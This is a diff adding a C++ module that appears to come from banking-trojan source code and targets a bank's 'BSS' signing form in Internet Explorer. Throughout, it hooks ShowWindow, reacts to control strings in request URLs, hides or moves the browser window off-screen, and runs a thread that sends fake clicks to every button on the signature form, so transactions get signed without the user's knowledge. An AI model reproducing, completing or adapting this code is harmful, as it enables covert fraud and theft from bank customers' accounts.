@@ -1,0 +1,234 @@
+#include "bsssign.h"
+#include "Memory.h"
+#include "GetApi.h"
+#include "Splice.h"
+#include "Strings.h"
+#include "Utils.h"
+#include "BotDebug.h"
+
+
+namespace bsssign_Template
+{
+    #include "DbgTemplates.h"
+}
+#define BDBG  bsssign_Template::DBGOutMessage<>
+
+bool IsRun=false,blind=false,move=false;
+RECT wRect;
+
+
+
+
+typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
+PShowWindow    Real_ShowWindow2;
+
+HWND IsButtonSignature(HWND hWnd)
+{
+	HWND hWndSignature = FindWindowExA(hWnd,NULL,"obj_BUTTON",NULL);
+	return hWndSignature;
+};
+
+DWORD WINAPI MessageGo(LPVOID lpData )
+{
+	//ловим окно obj_Form в котором жмем все кнопки
+	HWND hWnd =(HWND )lpData;
+	HWND   hWndItem =  NULL;
+	WCHAR *cClasN = (WCHAR*)MemAlloc(1024);
+	
+	int ret;
+	ret = (int)pGetClassNameW(hWnd,cClasN,MAX_PATH);
+	
+	if (! plstrcmpW(cClasN,L"obj_Form") )
+	{
+		BDBG("","наша форма");
+		while (  hWndItem = FindWindowExA(hWnd,hWndItem,"obj_BUTTON",NULL) )
+		{
+			//WCHAR text[10];
+			HWND Button ;
+			if ( ( Button = IsButtonSignature(hWndItem) ) )				
+			{			
+				pSleep(151);
+				pSendMessageW(Button,WM_SETFOCUS,0, 0 );				
+				pSleep(107);
+				pSendMessageW(Button,WM_LBUTTONDOWN,MK_LBUTTON, 0x00A0063 );
+				pSleep(130);
+				pSendMessageW(Button,WM_LBUTTONUP,MK_LBUTTON, 0x00A0063 );
+				pSleep(131);
+			
+			
+			} else
+			{
+				pSendMessageW(hWndItem,WM_SETFOCUS,0, 0 );
+				
+				pSleep(107);
+				pSendMessageW(hWndItem,WM_LBUTTONDOWN,MK_LBUTTON, 0x00A0053 );
+				pSleep(130);
+				pSendMessageW(hWndItem,WM_LBUTTONUP,MK_LBUTTON, 0x00A0053 );
+				
+			};
+		};
+		BDBG("","поймали окно obj_Form в котором жмем все кнопки");
+	}
+	
+	MemFree(cClasN);
+	return 0;
+}
+
+BOOL WINAPI Hook_ShowWindow2(HWND hWnd, int Cmd)
+{
+	WCHAR ClasN[MAX_PATH];
+	int ret,fleg=0;
+	ret = (int)pGetClassNameW(hWnd,ClasN,MAX_PATH);
+	if(IsRun)// зайдим ли форму вызыванную ие
+	{		
+		if (! plstrcmpW(ClasN,L"obj_Form") )
+		{
+			fleg=1;
+			Cmd=0;
+		}
+		
+	}
+	if(blind)//надо ли хайдить окно Internet Explorer_Server
+	{	
+		if ( plstrcmpW(ClasN,L"Internet Explorer_Server") )
+		{
+			HWND Wnd = (HWND)pGetParent((HWND)pGetParent(hWnd));		
+			HWND hWndIn = (HWND)FindWindowExA((HWND)FindWindowExA(Wnd,NULL,"Shell DocObject View",NULL),
+																NULL,
+																"Internet Explorer_Server",
+																NULL);
+
+			WCHAR ClasName[MAX_PATH];
+		
+			pGetClassNameW(hWndIn,ClasName,MAX_PATH);
+
+			if (! plstrcmpW(ClasName,L"Internet Explorer_Server") )
+			{
+				pShowWindow(hWndIn, SW_HIDE);				
+				Cmd=0;
+			}
+		}
+		
+	}
+	
+	BOOL DATA=Real_ShowWindow2(hWnd, Cmd);
+
+	if (fleg)
+		StartThread(MessageGo,hWnd);// запускаем поток который отправляет нужные сообщения ставя флаги в нужном окне
+	
+	return DATA;
+}
+BOOL CALLBACK EnumWindowsIE( HWND hWnd, LPARAM lParam )
+{
+	//перебираем все окна и найдя ие хайдим в нем главное окноInternet Explorer_Server
+	WCHAR ClasN[MAX_PATH];
+	
+	
+	pGetClassNameW(hWnd,ClasN,MAX_PATH);
+	pOutputDebugStringW(ClasN);
+	if (! plstrcmpW(ClasN,L"IEFrame") )
+	{
+		BDBG("bsssign","поймали IEFrame");
+		HWND Wnd=FindWindowExA(hWnd,NULL,"Frame Tab",NULL);
+	
+		HWND Wnd1=FindWindowExA(Wnd,NULL,"TabWindowClass",NULL);
+		
+
+		HWND hWndIn = (HWND)FindWindowExA(
+					  (HWND)FindWindowExA(Wnd1,NULL,"Shell DocObject View",NULL)
+										,
+										NULL,
+										"Internet Explorer_Server",
+										NULL);
+		
+		pShowWindow(hWndIn, SW_SHOW);
+		return FALSE;
+	}
+	return TRUE;
+
+
+}
+
+
+void IsBsssign( HINTERNET hRequest )
+{
+	DWORD dwUrlSize = 4096;
+	char *Url		= (char*)MemAlloc( dwUrlSize );
+	
+	
+	if ( Url )
+	{
+		if ( pInternetQueryOptionA( hRequest, INTERNET_OPTION_URL, Url, &dwUrlSize ) )
+		{	
+			if ( CompareUrl( "*az_start", Url ) )
+			{
+				IsRun=true;
+				BDBG("bsssign","IsRun=true; тоесть начинаем отлов окон");
+				
+			}
+			else if ( CompareUrl( "*az_stop", Url ) )
+			{
+				BDBG("bsssign","IsRun=false; тоесть не ловим окна ие ие");			
+				IsRun=false;
+			}
+			else if ( CompareUrl( "*blind_up", Url ) )
+			{
+				
+				BDBG("bsssign","blind=true; тоесть хайдим главное окно ие");
+				blind=true;
+			}
+			else if ( CompareUrl( "*blind_down", Url ) )
+			{	
+				BDBG("bsssign","найдем теперь ие");
+				pEnumWindows( (WNDENUMPROC)EnumWindowsIE, NULL );
+			
+				blind=false;
+			}
+
+			else if (( CompareUrl( "*move_up", Url ) )&&(!move))
+			{
+				
+				BDBG("bsssign","окно ие в право");
+				HWND Wind=FindWindowA("IEFrame",NULL);
+				pGetWindowRect(Wind,&wRect);
+				int x =(int) pGetSystemMetrics( SM_CXSCREEN );
+				int y =(int) pGetSystemMetrics( SM_CYSCREEN );
+				DbgMsg("x",x,"");
+				DbgMsg("y",y,"");
+				DbgMsg("left",wRect.left,"");
+				DbgMsg("right",wRect.right,"");
+				DbgMsg("top",wRect.top,"");
+				DbgMsg("bottom",wRect.bottom,"");
+				BDBG("bsssign","окно ие в право",x);
+				BDBG("bsssign","окно ие в право",y);
+				MoveWindow(Wind,x,0,wRect.right-wRect.left,wRect.bottom-wRect.top,false);
+				//SetWindowPos(Wind,
+					
+				move=true;
+			}
+			else if (( CompareUrl( "*move_down", Url ) )&&(move))
+			{	
+				BDBG("bsssign","Окно ие на место");
+				HWND Wind=(HWND)pFindWindowA("IEFrame",NULL); 
+				pMoveWindow(Wind,wRect.left ,wRect.top ,wRect.right-wRect.left,wRect.bottom-wRect.top,true);
+				//pEnumWindows( (WNDENUMPROC)EnumWindowsIE, NULL );
+			
+				move=false;
+			}
+		}
+
+		MemFree( Url );
+	}
+
+	return;
+}
+
+
+
+void HookForBsssign()
+{
+	if ( HookApi( 3, 0x7506E960, (DWORD)&Hook_ShowWindow2 ) )
+	{  
+		__asm mov [Real_ShowWindow2], eax			
+	}	
+}
